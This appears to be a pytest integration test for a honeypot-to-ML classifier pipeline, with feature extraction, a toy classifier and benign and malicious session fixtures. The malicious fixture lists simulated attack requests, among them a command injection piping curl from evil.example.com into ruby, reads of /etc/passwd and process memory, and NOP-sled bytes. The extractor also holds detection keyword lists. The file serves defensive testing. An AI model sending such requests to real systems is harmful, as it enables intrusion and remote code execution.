"""
Integration test: Honeypot System -> ML Classifier Pipeline.

Verifies that honeypot-captured attacker interactions are correctly
processed, features are extracted, and the ML classifier produces
valid classifications for honeypot-sourced data.
"""

from typing import Any

import numpy as np
import pytest


class HoneypotCapture:
    """Represents a captured honeypot interaction session."""

    def __init__(self, session_id: str, source_ip: str, service: str,
                 commands: list[str], payloads: list[bytes],
                 duration_seconds: float, bytes_received: int,
                 bytes_sent: int) -> None:
        self.session_id = session_id
        self.source_ip = source_ip
        self.service = service
        self.commands = commands
        self.payloads = payloads
        self.duration_seconds = duration_seconds
        self.bytes_received = bytes_received
        self.bytes_sent = bytes_sent

    @property
    def command_count(self) -> int:
        return len(self.commands)

    @property
    def payload_count(self) -> int:
        return len(self.payloads)

    @property
    def total_payload_size(self) -> int:
        return sum(len(p) for p in self.payloads)


class HoneypotFeatureExtractor:
    """Extracts ML features from honeypot capture sessions."""

    N_FEATURES = 47

    def extract(self, capture: HoneypotCapture) -> np.ndarray:
        """Extract feature vector from a honeypot capture.

        Maps honeypot-specific data to the same 47-feature space
        used by the classifier, enabling consistent classification.

        Args:
            capture: Honeypot capture session data.

        Returns:
            Feature vector of shape (47,).
        """
        features = np.zeros(self.N_FEATURES)

        # Syscall-equivalent features (from honeypot command analysis)
        features[0] = self._estimate_ptrace_relevance(capture.commands)
        features[1] = self._compute_command_entropy(capture.commands)
        features[2] = 1.0  # Single source IP
        features[3] = self._estimate_mmap_relevance(capture.commands)
        features[5] = capture.command_count
        features[6] = len([c for c in capture.commands if 'write' in c.lower()
                           or '>' in c])
        features[7] = self._compute_payload_entropy(capture.payloads)

        # Network features
        features[20] = 1.0  # unique outbound IPs from honeypot perspective
        features[21] = self._compute_command_entropy(capture.commands)
        features[22] = capture.bytes_received
        features[23] = capture.bytes_sent
        features[24] = (capture.bytes_sent / max(capture.bytes_received, 1))
        features[25] = capture.duration_seconds
        features[26] = capture.command_count / max(capture.duration_seconds, 0.1)

        # Process features
        features[35] = capture.command_count
        features[36] = capture.total_payload_size
        features[37] = capture.payload_count

        return features

    def _estimate_ptrace_relevance(self, commands: list[str]) -> float:
        """Estimate ptrace-like behavior from command patterns."""
        suspicious_patterns = ['ptrace', 'strace', 'gdb', 'attach', 'inject']
        count = sum(1 for cmd in commands
                    for pat in suspicious_patterns if pat in cmd.lower())
        return float(count)

    def _estimate_mmap_relevance(self, commands: list[str]) -> float:
        """Estimate memory manipulation from command patterns."""
        memory_patterns = ['mmap', 'mprotect', 'shellcode', 'payload', 'exec']
        count = sum(1 for cmd in commands
                    for pat in memory_patterns if pat in cmd.lower())
        return float(count)

    def _compute_command_entropy(self, commands: list[str]) -> float:
        """Compute Shannon entropy of concatenated command strings."""
        if not commands:
            return 0.0
        text = ' '.join(commands)
        if not text:
            return 0.0
        freq = np.zeros(256)
        for byte in text.encode('utf-8', errors='replace'):
            freq[byte] += 1
        freq = freq[freq > 0] / len(text)
        return float(-np.sum(freq * np.log2(freq)))

    def _compute_payload_entropy(self, payloads: list[bytes]) -> float:
        """Compute average entropy of binary payloads."""
        if not payloads:
            return 0.0
        entropies: list[float] = []
        for payload in payloads:
            if len(payload) == 0:
                continue
            freq = np.zeros(256)
            for byte in payload:
                freq[byte] += 1
            freq = freq[freq > 0] / len(payload)
            entropies.append(float(-np.sum(freq * np.log2(freq))))
        return np.mean(entropies) if entropies else 0.0


class SimpleClassifier:
    """Simplified classifier for integration testing."""

    def __init__(self, threshold: float = 0.5) -> None:
        self.threshold = threshold
        self.weights = np.zeros(47)
        self.weights[0] = 0.15   # ptrace relevance
        self.weights[1] = 0.10   # command entropy
        self.weights[3] = 0.08   # mmap relevance
        self.weights[5] = 0.06   # command count
        self.weights[7] = 0.12   # payload entropy
        self.weights[24] = 0.05  # bytes ratio
        self.weights[26] = 0.05  # command rate
        self.weights[36] = 0.08  # payload size
        self.bias = -1.5

    def predict_proba(self, features: np.ndarray) -> float:
        """Return probability of malicious classification."""
        score = float(np.dot(features, self.weights) + self.bias)
        return 1.0 / (1.0 + np.exp(-score))

    def predict(self, features: np.ndarray) -> str:
        """Return 'malicious' or 'benign' label."""
        return 'malicious' if self.predict_proba(features) > self.threshold else 'benign'


class TestHoneypotToClassifier:
    """Integration tests for honeypot capture -> ML classification pipeline."""

    @pytest.fixture
    def extractor(self) -> HoneypotFeatureExtractor:
        return HoneypotFeatureExtractor()

    @pytest.fixture
    def classifier(self) -> SimpleClassifier:
        return SimpleClassifier(threshold=0.5)

    @pytest.fixture
    def malicious_capture(self) -> HoneypotCapture:
        """Simulate a malicious honeypot session with attack commands."""
        return HoneypotCapture(
            session_id='sess-001',
            source_ip='198.51.100.42',
            service='fake_rails',
            commands=[
                'GET /admin HTTP/1.1',
                'POST /exec?cmd=eval(Base64.decode64("cHV0cyAiaGFja2VkIg=="))',
                'GET /proc/self/maps',
                'POST /upload payload=shellcode_loader.rb',
                'GET /etc/passwd',
                'POST /exec?cmd=system("curl http://evil.example.com|ruby")',
                'POST /inject?target_pid=1234&method=ptrace',
                'GET /proc/1234/mem',
            ],
            payloads=[
                b'\x90' * 100 + b'\x48\x31\xc0\x48\x89\xc2',
                b'eval(Base64.decode64("cHV0cyAiaGFja2VkIg=="))',
            ],
            duration_seconds=45.0,
            bytes_received=4096,
            bytes_sent=2048
        )

    @pytest.fixture
    def benign_capture(self) -> HoneypotCapture:
        """Simulate a benign honeypot session (scanner/crawler)."""
        return HoneypotCapture(
            session_id='sess-002',
            source_ip='203.0.113.10',
            service='fake_rails',
            commands=[
                'GET / HTTP/1.1',
                'GET /robots.txt HTTP/1.1',
                'GET /sitemap.xml HTTP/1.1',
            ],
            payloads=[],
            duration_seconds=5.0,
            bytes_received=512,
            bytes_sent=1024
        )

    def test_feature_extraction_shape(self, extractor: HoneypotFeatureExtractor,
                                       malicious_capture: HoneypotCapture) -> None:
        """Feature vector should have correct dimensionality."""
        features = extractor.extract(malicious_capture)
        assert features.shape == (47,)
        assert np.all(np.isfinite(features))

    def test_feature_extraction_non_negative(self, extractor: HoneypotFeatureExtractor,
                                              malicious_capture: HoneypotCapture) -> None:
        """All features should be non-negative."""
        features = extractor.extract(malicious_capture)
        assert np.all(features >= 0), "Features contain negative values"

    def test_malicious_capture_classified_correctly(
        self, extractor: HoneypotFeatureExtractor,
        classifier: SimpleClassifier,
        malicious_capture: HoneypotCapture
    ) -> None:
        """Malicious honeypot session should be classified as malicious."""
        features = extractor.extract(malicious_capture)
        label = classifier.predict(features)
        assert label == 'malicious', (
            f"Expected malicious, got {label} "
            f"(prob={classifier.predict_proba(features):.3f})"
        )

    def test_benign_capture_classified_correctly(
        self, extractor: HoneypotFeatureExtractor,
        classifier: SimpleClassifier,
        benign_capture: HoneypotCapture
    ) -> None:
        """Benign honeypot session should be classified as benign."""
        features = extractor.extract(benign_capture)
        label = classifier.predict(features)
        assert label == 'benign', (
            f"Expected benign, got {label} "
            f"(prob={classifier.predict_proba(features):.3f})"
        )

    def test_malicious_has_higher_threat_score(
        self, extractor: HoneypotFeatureExtractor,
        classifier: SimpleClassifier,
        malicious_capture: HoneypotCapture,
        benign_capture: HoneypotCapture
    ) -> None:
        """Malicious captures should have higher threat scores than benign."""
        mal_features = extractor.extract(malicious_capture)
        ben_features = extractor.extract(benign_capture)
        mal_prob = classifier.predict_proba(mal_features)
        ben_prob = classifier.predict_proba(ben_features)
        assert mal_prob > ben_prob

    def test_ptrace_commands_increase_threat_score(
        self, extractor: HoneypotFeatureExtractor,
        classifier: SimpleClassifier
    ) -> None:
        """Sessions with ptrace-like commands should score higher."""
        base = HoneypotCapture('s1', '1.2.3.4', 'fake_rails',
                               ['GET / HTTP/1.1'], [], 5.0, 256, 512)
        with_ptrace = HoneypotCapture('s2', '1.2.3.4', 'fake_rails',
                                       ['ptrace ATTACH 1234', 'inject shellcode'],
                                       [b'\x90' * 50], 10.0, 1024, 512)

        base_score = classifier.predict_proba(extractor.extract(base))
        ptrace_score = classifier.predict_proba(extractor.extract(with_ptrace))
        assert ptrace_score > base_score

    def test_payload_entropy_affects_classification(
        self, extractor: HoneypotFeatureExtractor
    ) -> None:
        """High-entropy payloads should produce higher entropy features."""
        low_entropy_payload = b'\x00' * 100
        high_entropy_payload = bytes(range(256)) * 4

        low_capture = HoneypotCapture('s1', '1.2.3.4', 'test',
                                       ['cmd'], [low_entropy_payload], 5.0, 100, 100)
        high_capture = HoneypotCapture('s2', '1.2.3.4', 'test',
                                        ['cmd'], [high_entropy_payload], 5.0, 100, 100)

        low_features = extractor.extract(low_capture)
        high_features = extractor.extract(high_capture)

        assert high_features[7] > low_features[7], (
            "High entropy payload should produce higher entropy feature"
        )

    def test_empty_session_does_not_crash(
        self, extractor: HoneypotFeatureExtractor,
        classifier: SimpleClassifier
    ) -> None:
        """Empty honeypot session should produce valid (benign) classification."""
        empty = HoneypotCapture('s0', '0.0.0.0', 'test', [], [], 0.0, 0, 0)
        features = extractor.extract(empty)
        assert features.shape == (47,)
        assert np.all(np.isfinite(features))
        label = classifier.predict(features)
        assert label == 'benign'
